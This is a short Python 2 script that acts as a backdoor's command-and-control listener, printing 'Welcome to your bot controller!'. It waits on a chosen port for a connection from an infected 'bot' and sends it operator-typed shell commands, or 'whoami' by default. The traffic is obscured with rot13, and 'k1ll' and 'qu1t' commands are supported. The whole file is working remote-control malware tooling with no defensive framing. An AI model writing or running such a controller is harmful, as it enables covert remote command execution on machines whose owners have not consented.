import socket
import sys
import argparse

parser=argparse.ArgumentParser()
parser.add_argument('-p','--port',required=True,help='Port to listen on',dest='port')
args=parser.parse_args()

print "Welcome to your bot controller! \nUse the command 'qu1t' to end your session and 'k1ll' to kill the backdoor\n"

mysocket=socket.socket()
mysocket.bind(("",int(args.port)))
mysocket.listen(1)

connection,fromaddr = mysocket.accept()
while True:
    request = connection.recv(10240)
    if "k1ll" in request.decode("rot13"):
        print "k1ll command issued, closing."
        mysocket.close()
        sys.exit()
    if "qu1t" in request.decode("rot13"):
        print "qu1t command issued, closing."
        mysocket.close()
        sys.exit()
    print "from bot: \n" + str(request.decode("rot13"))
    command = raw_input("enter command: \n")
    if command:
        connection.send(command.encode("rot13"))
    if not command:
        print "you entered nothing, sending whoami command"
        connection.send("whoami".encode("rot13"))